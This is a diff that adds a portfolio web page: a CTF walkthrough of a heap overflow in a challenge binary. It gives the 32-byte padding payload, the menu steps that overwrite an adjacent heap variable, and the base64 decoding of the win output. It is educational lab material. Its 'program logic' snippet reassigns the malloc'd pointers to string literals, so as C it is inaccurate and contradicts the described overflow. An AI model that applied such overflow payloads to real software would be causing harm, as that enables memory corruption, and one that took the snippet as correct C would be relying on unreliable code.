@@ -1,0 +1,124 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Heap Overflow CTF Walkthrough | Ahmed Vasil</title>
+  <meta name="description" content="Heap Overflow CTF walkthrough — overflowing a heap buffer corrupts the adjacent safe_var and triggers the win condition.">
+  <link rel="canonical" href="https://vasilahmed744.github.io/Ahmed-Vasil-Portfolio/walkthrough-heap-overflow.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&amp;family=IBM+Plex+Serif:ital,wght@0,500;0,600;0,700;1,500&amp;display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="index.html"><span class="brand-mark">AV</span><span><span class="brand-name">Ahmed Vasil</span><br><span class="brand-role">Aspiring Penetration Tester</span></span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="index.html">Home</a>
+      <a href="about.html">About</a>
+      <a href="projects.html">Projects</a>
+      <a href="skills.html">Skills</a>
+      <a href="journey.html">Journey</a>
+      <a href="walkthroughs.html" class="active">Walkthroughs</a>
+      <a href="contact.html" class="nav-cta">Contact</a>
+    </nav>
+  </div>
+</header>
+<main>
+  <div class="wrap">
+    <div class="page-head anim d1">
+      <span class="eyebrow"><span class="section-no">06</span>Walkthroughs · Binary Exploitation</span>
+      <div class="gold-rule"></div>
+      <h1>Heap Overflow CTF — Walkthrough</h1>
+      <p class="lede">Overflowing a heap buffer corrupts the adjacent safe_var and triggers the win condition.</p>
+    </div>
+    <section class="block wt-content">
+      <table class="info-table anim d2">
+        <tr><th>Target</th><td>Uploaded 64-bit Linux ELF heap challenge</td></tr>
+      </table>
+
+      <h2 class="anim d2">1. Challenge idea</h2>
+      <p>The program allocates two small buffers on the heap. The first is attacker-controlled (input_data) and the second contains the protected value safe_var. The input routine uses <code class="inline">scanf("%s", input_data)</code> without a width limit, so writing beyond input_data can corrupt the adjacent safe_var allocation.</p>
+
+      <h2>2. Initial heap layout</h2>
+      <pre class="code"><code>Heap State:
+input_data -&gt; 0x...52b0 -&gt; blue
+safe_var   -&gt; 0x...52d0 -&gt; red
+
+Distance: 0x20 bytes = 32 bytes</code></pre>
+      <p>Although malloc is called with a size of 5 for each value, the allocator places the returned user pointers 32 bytes apart in this run. Therefore 32 bytes of padding reaches the beginning of safe_var.</p>
+
+      <h2>3. Relevant program logic</h2>
+      <pre class="code"><code>input_data = malloc(5);
+input_data = "blue";
+
+safe_var = malloc(5);
+safe_var = "red";
+
+/* vulnerable write */
+scanf("%s", input_data);
+
+/* win condition */
+if (strcmp(safe_var, "red") != 0)
+    puts("Rmxne2Ixbl9leHBsMDF0fQo=");</code></pre>
+      <p>The hidden condition is not a specific replacement word. The check succeeds whenever safe_var is changed so that it is no longer equal to "red".</p>
+
+      <h2>4. Trigger the heap overflow</h2>
+      <p>Choose menu option 2 and provide 32 padding bytes followed by a replacement value:</p>
+      <pre class="code"><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn</code></pre>
+      <p>Then choose option 3. A successful overwrite shows:</p>
+      <pre class="code"><code>safe_var = pwn</code></pre>
+
+      <h2>5. Trigger the win condition</h2>
+      <p>Choose menu option 4. Running the supplied binary produces:</p>
+      <pre class="code"><code>Rmxne2Ixbl9leHBsMDF0fQo=</code></pre>
+      <p>This output was verified by executing the uploaded binary with the overflow payload above.</p>
+
+      <h2>6. Decode the program output</h2>
+      <pre class="code"><code>echo 'Rmxne2Ixbl9leHBsMDF0fQo=' | base64 -d</code></pre>
+      <p>Decoded value:</p>
+      <div class="flag-callout"><span class="flag-label">Program output — decoded</span><code>Flg{b1n_expl01t}</code></div>
+      <div class="note"><strong>Important submission note.</strong> The decoded value above is exactly what the supplied binary contains and emits after the win condition. However, it was reported as rejected by the challenge platform. Therefore this walkthrough does NOT claim that the decoded value is the platform-accepted final flag. The exploitation path is verified; the submission-format/platform discrepancy remains unresolved.</div>
+
+      <h2>7. Reproduce from the terminal</h2>
+      <pre class="code"><code>chmod +x heap
+./heap
+
+# Menu interaction:
+2
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn
+3
+4</code></pre>
+
+      <h2>8. Why the overflow works</h2>
+      <p>Heap memory is not automatically protected from memory corruption. The vulnerability is the unbounded write, not whether the destination lives on the stack or heap. Because input_data and safe_var are adjacent heap allocations, overflowing the first allocation changes the contents of the second and satisfies the program's hidden comparison.</p>
+      <table class="wt-table">
+        <tr><th>Stage</th><th>Result</th></tr>
+        <tr><td>Initial value</td><td>safe_var = red</td></tr>
+        <tr><td>Overflow offset</td><td>32 bytes</td></tr>
+        <tr><td>Example payload</td><td>A x 32 + pwn</td></tr>
+        <tr><td>After corruption</td><td>safe_var = pwn</td></tr>
+        <tr><td>Program win output</td><td><code>Rmxne2Ixbl9leHBsMDF0fQo=</code></td></tr>
+        <tr><td>Base64 decoded</td><td><code>Flg{b1n_expl01t}</code></td></tr>
+        <tr><td>Platform acceptance</td><td>Reported rejected / not verified</td></tr>
+      </table>
+      <div class="wt-nav">
+        <a href="walkthrough-privilege-escalation.html">← CTF Privilege Escalation</a>
+        <a href="walkthrough-exif-puzzle.html">Next: Exif Puzzle CTF →</a>
+      </div>
+    </section>
+  </div>
+</main>
+<footer>
+  <div class="wrap footer-cta"><a href="contact.html">Work with me →</a></div>
+  <div class="wrap footer-inner">
+    <span class="f-name">Ahmed Vasil</span>
+    <span class="f-role">Aspiring Penetration Tester</span>
+    <span class="footer-links"><a href="https://github.com/vasilahmed744">GitHub</a><a href="https://www.linkedin.com/in/ahamad-vasil-205590386">LinkedIn</a></span>
+  </div>
+  <div class="wrap footer-base"><span>© Ahmed Vasil</span><span>Narasimharajapura, Karnataka, India</span></div>
+</footer>
+</body>
+</html>
